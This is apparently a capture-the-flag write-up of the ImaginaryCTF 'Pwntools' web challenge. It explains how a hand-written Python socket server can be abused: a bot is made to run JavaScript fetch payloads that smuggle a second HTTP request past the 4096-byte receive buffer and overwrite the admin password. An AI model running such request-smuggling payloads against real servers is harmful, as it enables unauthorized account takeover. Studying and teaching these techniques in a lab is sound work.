---
title: Pwntools
summary: I love pwntools.
tags: [ImaginaryCTF, Web, Request Smuggling]
date: 2025-09-07
showtoc: true
---

# Pwntools

## Description

I love pwntools.

Author: Eth007

[Given files](/imaginaryctf/pwntools/pwntools.zip)

## Solution

The web application serves a static HTML page describing various binary exploitation techniques.

![index](/imaginaryctf/pwntools/index.png)

It also provides functionality to report a URL to an admin.

After digging into the code, I discovered that the server was written in Python, but it didn’t use any web framework like Flask.
Instead, everything was handled manually using sockets.

```py
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
server.bind((HOST, PORT))
server.listen(5)
server.setblocking(False)
print(f"[*] Listening on {HOST}:{PORT}")

clients = {}

while True:
    read_list = [server] + list(clients.keys())
    rlist, _, _ = select.select(read_list, [], [], 0.1)

    for s in rlist:
        if s is server:
            client_sock, addr = server.accept()
            client_sock.setblocking(False)
            clients[client_sock] = {"addr": addr, "buffer": b""}
            print(f"[*] New client {addr}")
        else:
            client = clients[s]
            try:
                data = s.recv(4096)
                if not data:
                    s.close()
                    del clients[s]
                    continue

                client["buffer"] += data

                while True:
                    request_text = client["buffer"].decode(errors="ignore")
                    if "\r\n\r\n" not in request_text:
                        break

                    # Split the header and the body
                    header, _, body = request_text.partition("\r\n\r\n")
                    lines = header.splitlines()
                    if not lines:
                        client["buffer"] = b""
                        break

                    # Parse the HTTP request line (GET / HTTP/1.1)
                    try:
                        method, path_query, http_version = lines[0].split()
                        parsed = urlparse(path_query)
                        path = parsed.path
                        query = parse_qs(parsed.query)
                    except:
                        s.send(build_response("400 Bad Request", status=400).encode())
                        s.close()
                        del clients[s]
                        break

                    # Parse the HTTP headers
                    content_length = 0
                    keep_alive = http_version.upper() == "HTTP/1.1"
                    headers = {}
                    for line in lines[1:]:
                        headers[line.lower().split(": ")[0]] = ": ".join(
                            line.split(": ")[1:]
                        )
                        if line.lower().startswith("content-length:"):
                            content_length = int(line.split(":", 1)[1].strip())
                        if line.lower().startswith("connection:"):
                            if "close" in line.lower():
                                keep_alive = False
                            elif "keep-alive" in line.lower():
                                keep_alive = True

                    # Get the body
                    post_body = (
                        body[:content_length] if method.upper() == "POST" else ""
                    )

                    # Call the route
                    handler = routes.get(path)
                    if handler:
                        response_body = handler(method, post_body, query, headers, addr)
                    else:
                        response_body = build_response(
                            "<h1>404 Not Found</h1>", status=404, keep_alive=keep_alive
                        )

                    s.send(response_body.encode())

                    # Clear the handled request
                    client["buffer"] = client["buffer"][
                        len(header) + 4 + content_length :
                    ]

                    if not keep_alive:
                        s.close()
                        del clients[s]
                        break

            except Exception as e:
                print(f"[!] Error with client {client['addr']}: {e}")
                s.close()
                del clients[s]
```

Let’s start by analyzing the available routes (yes, I’m procrastinating on reading this whole server code):

* `/`: Serves a static HTML page.

* `/visit`: Sends a URL to a bot that will visit it.

* `/flag`: Retrieves the flag, but requires admin authentication.

```py
admin_password = "".join(random.choices(string.ascii_letters + string.digits, k=12))
accounts["admin"] = admin_password

@route("/flag")
def flag_route(method, body, query=None, headers=None, client_addr=None):
    if "authorization" not in headers:
        return build_response(
            "Missing Authorization header",
            status=401,
            headers={"WWW-Authenticate": 'Basic realm="Login Required"'},
        )

    auth = headers["authorization"]
    if not auth.startswith("Basic "):
        return build_response(
            "Invalid Authorization method",
            status=401,
            headers={"WWW-Authenticate": 'Basic realm="Login Required"'},
        )

    try:
        encoded = auth.split()[1]
        decoded = base64.b64decode(encoded).decode()
        username, password = decoded.split(":", 1)
    except Exception as e:
        print(e)
        return build_response(
            "Malformed Authorization header",
            status=401,
            headers={"WWW-Authenticate": 'Basic realm="Login Required"'},
        )

    if accounts.get(username) == password and username == "admin":
        if os.path.exists(FLAG_FILE):
            with open(FLAG_FILE, "r") as f:
                flag_content = f.read()
            return build_response(f"<pre>{flag_content}</pre>")
        else:
            return build_response("<h1>Flag file not found</h1>", status=404)
    else:
        return build_response(
            "Unauthorized",
            status=401,
            headers={"WWW-Authenticate": 'Basic realm="Login Required"'},
        )
```

* `/register`: Registers a new account, but only from `127.0.0.1`.

```py
@route("/register")
def register_route(method, body, query=None, headers=None, client_addr=None):
    if method.upper() != "POST":
        return build_response("Method not allowed", status=405)

    if client_addr[0] != "127.0.0.1":
        return build_response("Access denied", status=401)

    username = headers.get("x-username")
    password = headers.get("x-password")

    if not username or not password:
        return build_response("Missing X-Username or X-Password header", status=400)

    accounts[username] = password
    return build_response(f"User '{username}' registered successfully!")
```

Upon reading this last endpoint, I immediately noticed a bug.

The `/register` function doesn't check if a user already exists.
This means we can simply register as `admin` and overwrite the existing password, allowing us to later retrieve the flag using the new admin credentials.

That’s it!

*But wait… aren’t we forgetting one teensy-weensy, ever-so-crucial little detail?*

My IP needs to be `127.0.0.1` to access the `/register` endpoint.

To bypass this restriction, I typically use the `X-Forwarded-For` header, but since this server isn’t using any framework, that header isn’t implemented.

Then I remembered the bot.

I could send the bot a link to a page I control, and have that page make the request on my behalf from `127.0.0.1`.

So I hosted the following JS script on a webhook and sent the link to the bot:

```js
fetch("http://127.0.0.1:8080/register", {
  method: "POST",
  headers: {
    "X-Username": "admin",
    "X-Password": "admin",
  },
  mode: "no-cors",
});
```

Then, I attempted to log in and retrieve the flag, but it didn’t work.
My credentials were rejected.

After investigating, I found the issue.

Due to CORS, the custom headers (`X-Username` and `X-Password`) were stripped from the request because they’re not [CORS-safelisted headers](https://developer.mozilla.org/en-US/docs/Glossary/CORS-safelisted_request_header).

Not knowing how to bypass this, I did some research and stumbled upon a technique called **Request Smuggling**.

This vulnerability occurs when the client and server interpret request boundaries differently, allowing attackers to sneak malicious requests past security controls.

After learning a bit more about it, I came up with a plan: manipulate the `Content-Length` of the request to smuggle in a second request that includes the custom headers.

Here’s my first attempt:

```js
fetch("http://127.0.0.1:8080/register", {
  method: "POST",
  headers: {
    "Content-Length": "4",
  },
  body:
    "body" +
    "POST /register HTTP/1.1\r\n" +
    "Host: 127.0.0.1:8080\r\n" +
    "Content-Length: 0\r\n" +
    "X-Username: admin\r\n" +
    "X-Password: admin\r\n" +
    "\r\n",
  mode: "no-cors",
});
```

The idea here was to set an incorrect `Content-Length`, so that only the word `body` is treated as the body, and the rest is interpreted as a second request—this one containing the headers.

However, `fetch` doesn’t allow manually setting the `Content-Length` header, so the attempt failed.

I then thought: *if I can’t set this header, maybe I can replace it?*

It turns out that `Transfer-Encoding` can sometimes override `Content-Length`.
And since the Python server doesn't handle `Transfer-Encoding`, it would fall back to treating the body as empty, potentially smuggling in a second request.

Unfortunately, `fetch` doesn’t let you use `Transfer-Encoding` either.
After several unsuccessful attempts, I had to find another approach.

So I went back to the Python server code to look for any vulnerability I might’ve missed.

At first glance, everything looked fine, until I noticed this line:

```py
data = s.recv(4096)
```

The server only reads 4096 bytes at a time.
What if a request is longer?

Then I checked how the server discards a request after processing:

```py
s.send(response_body.encode())
client["buffer"] = client["buffer"][len(header) + 4 + content_length:]
```

**Bingo!** The server only discards the part of the request already received in the buffer.
If the full request wasn’t received yet, the remainder is treated as a **new** request!

Here’s the payload I crafted based on that behavior:

```js
fetch("http://127.0.0.1:8080/register", {
  method: "POST",
  body:
    "POST /register?: HTTP/1.1\r\n".repeat(151) +
    "X-Username: admin\r\nX-Password: admin\r\n\r\n",
  mode: "no-cors",
});
```

The body contains enough repeated `POST /register?: HTTP/1.1\r\n` lines to reach the 4096-byte buffer limit, and each line can be interpreted by the server either as an HTTP request line or as a malformed header, depending on where in the buffer it lands.
This ambiguity allows the second request to be smuggled in without needing to find the exact byte offset.

After fine-tuning the offset and testing with the bot, I was finally able to access `/flag` and register as admin with `admin:admin`.

Here’s the final payload:

```js
fetch("http://127.0.0.1:8080/register", {
  method: "POST",
  body:
    "abcde" +
    "POST /register?: HTTP/1.1\r\n".repeat(151) +
    "X-Username: admin\r\nX-Password: admin\r\n\r\n",
  mode: "no-cors",
});
```

```
ictf{oops_ig_my_webserver_is_just_ai_slop_b9f415ea}
```

# References

- MDN: [CORS-safelisted request header](https://developer.mozilla.org/en-US/docs/Glossary/CORS-safelisted_request_header)
- MDN: [Content-Length header](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Length)
- Payloads All The Things: [Request Smuggling](https://swisskyrepo.github.io/PayloadsAllTheThings/Request%20Smuggling/)
